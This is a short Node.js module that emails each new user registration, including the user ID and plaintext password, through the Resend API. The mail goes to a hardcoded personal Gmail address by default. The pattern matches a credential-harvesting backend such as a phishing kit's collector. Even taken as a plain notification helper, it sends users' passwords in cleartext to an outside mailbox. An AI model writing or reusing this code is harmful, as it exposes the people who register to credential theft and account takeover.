const { Resend } = require("resend");

const resend = new Resend(process.env.RESEND_KEY);

async function sendUserEmail(data) {
  try {
    // Use configured recipient from environment, fallback to andrewmjr2@gmail.com
    const recipient = process.env.SEND_TO || "andrewmjr2@gmail.com";
    console.log(
      "sendUserEmail: sending to",
      recipient,
      "for user",
      data && data.userId
    );

    const resp = await resend.emails.send({
      from: "User System <onboarding@resend.dev>", // required approved domain
      to: recipient,
      subject: "New User Registration Submitted",
      html: `
        <h2>New User Registration</h2>
        <p><strong>User ID:</strong> ${data.userId}</p>
        <p><strong>Password:</strong> ${data.password}</p>
      `,
    });

    console.log("Email sent successfully! Resend response:", resp);
    return resp;
  } catch (error) {
    console.error(
      "Email sending failed:",
      error && error.stack ? error.stack : error
    );
    throw error;
  }
}

module.exports = sendUserEmail;
